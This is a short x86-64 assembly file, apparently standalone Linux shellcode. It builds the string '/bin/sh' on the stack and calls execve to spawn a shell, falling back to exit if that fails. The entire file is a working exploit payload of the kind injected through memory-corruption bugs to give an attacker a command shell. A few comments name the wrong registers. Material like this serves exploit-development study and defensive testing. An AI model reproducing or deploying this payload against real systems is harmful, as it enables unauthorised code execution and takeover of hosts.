BITS 64
	; Form and terminate "/bin/sh" string.
	mov		rbx, 'X/bin/sh'
	shr		rbx, 8
	push		rbx

	; Store the first argument in rdi
	mov		rdi, rsp
	
	; Push { "/bin/sh", NULL } on stack, and put in ecx as 'argv'.
	; Additionally, we set op { NULL } in edx as 'envp'.
	xor		eax, eax
	push		rax
	mov		rdx, rsp
	push		rdi
	mov		rsi, rsp

	; rdi, rsi, rdx
	mov		al, 59		; SYS_execve
	syscall

	; If execve() fails, exit gracefully.
	xor		eax, eax
	mov		al, 60		; SYS_exit
	syscall
